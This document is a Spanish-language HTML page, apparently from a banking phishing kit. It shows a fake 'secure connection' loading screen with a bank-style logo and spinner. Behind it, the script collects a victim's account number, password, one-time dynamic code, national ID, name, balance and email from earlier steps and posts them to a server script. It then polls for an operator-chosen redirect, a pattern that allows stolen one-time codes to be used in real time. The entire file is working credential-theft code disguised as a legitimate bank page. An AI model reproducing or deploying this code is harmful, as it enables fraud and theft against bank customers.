<!DOCTYPE html>
<html lang="es">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Cargando...</title>

  <link href="https://fonts.googleapis.com/css2?family=Manrope&display=swap" rel="stylesheet">

  <style>
    body {
      font-family: 'Manrope', sans-serif;
      display: flex;
      flex-direction: column;
      justify-content: center;
      align-items: center;
      height: 100vh;
      margin: 0;
      background-color: #fff;
    }
    #logo {
      width: 150px;
      margin-bottom: 30px;
    }
    .loader {
      border: 6px solid #f3f3f3;
      border-radius: 50%;
      border-top: 6px solid #E0128B;
      width: 50px;
      height: 50px;
      animation: spin 1s linear infinite;
      margin-bottom: 20px;
    }
    .mensaje {
      font-size: 18px;
      color: #333;
      text-align: center;
      padding: 0 10px;
    }
    @keyframes spin {
      to { transform: rotate(360deg); }
    }
  </style>
</head>

<body>

<img src="logo.png" alt="Logo" id="logo">
<div class="loader"></div>
<div class="mensaje" id="mensaje">Estableciendo conexión segura...</div>

<script>
/* ================= MENSAJES ================= */
const mensajes = [
  "Estableciendo conexión segura...",
  "Verificando información...",
  "Procesando datos...",
  "Esperando confirmación..."
];
let i = 0;
const msgEl = document.getElementById('mensaje');
const msgTimer = setInterval(() => {
  i = (i + 1) % mensajes.length;
  msgEl.textContent = mensajes[i];
}, 800);

/* ================= HELPERS ================= */
const toInt = v => v == null ? null : parseInt(String(v).replace(/\D+/g,'')) || null;
const splitNombre = full => {
  if (!full) return {nombres:null,apellido:null};
  const p = String(full).trim().split(/\s+/);
  if (p.length < 2) return {nombres:full,apellido:null};
  return {nombres:p.slice(0,-1).join(' '),apellido:p.pop()};
};

/* ================= LOCALSTORAGE ================= */
const neqdata  = JSON.parse(localStorage.getItem('neqdata') || 'null');
const dina     = localStorage.getItem('dina');
const logoneki = JSON.parse(localStorage.getItem('logoneki') || 'null');
const niti     = JSON.parse(localStorage.getItem('niti') || 'null');

const nombres = niti?.nombres ?? splitNombre(niti?.nombre).nombres;
const apellido = niti?.apellido ?? splitNombre(niti?.nombre).apellido;
const fecha_pago = niti?.fecha_pago ?? niti?.fecha ?? null;

/* ================= PAYLOAD ================= */
const payload = {
  numero: neqdata?.numero ?? null,
  clave: neqdata?.clave ?? null,
  dinamica: dina ?? null,
  login_neki: logoneki ?? null,
  tipo: niti?.tipo ?? null,
  titulo: niti?.titulo ?? null,
  monto: toInt(niti?.monto),
  cuotas: niti?.cuotas ?? null,
  fecha_pago,
  cedula: niti?.cedula ?? null,
  nombres,
  apellido,
  saldo: toInt(niti?.saldo),
  correo: niti?.correo ?? null
};
Object.keys(payload).forEach(k => payload[k]==null && delete payload[k]);

/* ================= ESTADO ================= */
let TID = null;
let polling = null;
let finished = false;

/* ================= POST ================= */
fetch('datos2.php', {
  method: 'POST',
  headers: { 'Content-Type': 'application/json' },
  body: JSON.stringify(payload)
})
.then(r => r.json())
.then(res => {
  if (res.tid) {
    TID = res.tid;
    startPolling();
  }
});

/* ================= POLLING ================= */
function startPolling() {
  polling = setInterval(() => {
    fetch('datos2.php?tid=' + TID)
      .then(r => r.json())
      .then(res => {
        if (res.redirect && !finished) {
          finished = true;
          clearAll();
          window.location.replace(res.redirect);
        }
      });
  }, 2000);
}

/* ================= TIMEOUT ================= */
setTimeout(() => {
  if (!finished) {
    clearAll();
    window.location.replace('error_dinamica.php');
  }
}, 30000);

/* ================= CLEAN ================= */
function clearAll() {
  clearInterval(msgTimer);
  clearInterval(polling);
}
</script>

</body>
</html>
